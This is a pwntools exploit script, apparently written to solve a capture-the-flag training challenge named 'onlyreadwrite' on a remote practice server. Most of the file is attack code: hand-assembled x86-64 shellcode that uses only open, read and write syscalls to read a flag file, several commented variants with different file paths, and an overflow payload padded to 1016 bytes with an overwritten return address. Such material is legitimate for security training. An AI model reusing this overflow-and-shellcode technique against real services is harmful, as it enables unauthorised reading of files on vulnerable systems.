from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./onlyreadwrite") 
r = remote("bin.training.jinblack.it", 2006)

# try seccomp-tools dump ./onlyreadwrite to check what it can be called

#/chall/flag
'''
#open
# this is fine in local because the path is
# home/onlyreadwrite/flag, but the path in remote
# is probably /chall/flag
xor rax, rax
mov rax, 0x2
xor rsi, rsi
push 0x67616c66
push 0x2f657469
push 0x72776461
push 0x6572796c
push 0x6e6f2f65
push 0x6d6f682f
mov rdi, rsp
syscall

#open with flag
xor rax, rax
mov rax, 0x2
xor rsi, rsi
push 0x67616c
mov rdi, rsp
syscall

#open with /onlyreadwrite/flag
xor rax, rax
mov rax, 0x2
xor rsi, rsi
push 0x6761
push 0x6c662f65
push 0x74697277
push 0x64616572
push 0x796c6e6f
mov rdi, rsp
syscall



#read
mov rsi, rdi
mov rdi, rax
xor rax, rax
mov rdx, 0x50
syscall


#write
mov rax, 0x1
mov rdi, rax
syscall 

'''
'''
gdb.attach(r, """
	b *0x004009af
	c
	si
	ni 10
""")
'''
open_64 = b"\x48\x31\xC0\x48\xC7\xC0\x02\x00\x00\x00\x48\x31\xF6\x68\x66\x6C\x61\x67\x48\x89\xE7\x0F\x05"
#open_64 = b"\x48\x31\xC0\x48\xC7\xC0\x02\x00\x00\x00\x48\x31\xF6\x68\x6C\x61\x67\x00\x68\x6C\x6C\x2F\x66\x68\x2F\x63\x68\x61\x48\x89\xE7\x0F\x05"
#open_64 = b"\x48\x31\xC0\x48\xC7\xC0\x02\x00\x00\x00\x48\x31\xF6\x68\x61\x67\x00\x00\x68\x65\x2F\x66\x6C\x68\x77\x72\x69\x74\x68\x72\x65\x61\x64\x68\x6F\x6E\x6C\x79\x48\x89\xE7\x0F\x05"
read_64 = b"\x48\x89\xFE\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC2\x50\x00\x00\x00\x0F\x05"
write_64 = b"\x48\xC7\xC0\x01\x00\x00\x00\x48\x89\xC7\x0F\x05"
payload_64 = open_64 + read_64 + write_64 + b"\x00"


shellcode = payload_64.ljust(1016,b"A")+ p64(0x006020c0)


r.send(shellcode)

r.interactive()


